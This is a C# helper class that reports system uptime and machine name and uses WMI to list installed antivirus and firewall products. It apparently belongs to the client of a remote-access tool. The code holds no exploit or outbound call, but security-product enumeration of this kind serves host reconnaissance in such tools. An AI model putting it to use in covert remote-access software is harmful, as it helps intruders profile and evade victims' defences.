using System;
using System.Management;

namespace xClient.Core.Helper
{
    public static class SystemHelper
    {
        public static string GetUptime()
        {
            try
            {
                string uptime = string.Empty;

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);

                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
                        break;
                    }
                }

                if (string.IsNullOrEmpty(uptime))
                    throw new Exception("Getting uptime failed");

                return uptime;
            }
            catch (Exception)
            {
                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
            }
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetAntivirus()
        {
            try
            {
                string antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "SELECT * FROM AntivirusProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        antivirusName += mObject["displayName"].ToString() + "; ";
                    }
                }
                antivirusName = FormatHelper.RemoveEnd(antivirusName);

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "SELECT * FROM FirewallProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = FormatHelper.RemoveEnd(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }
    }
}
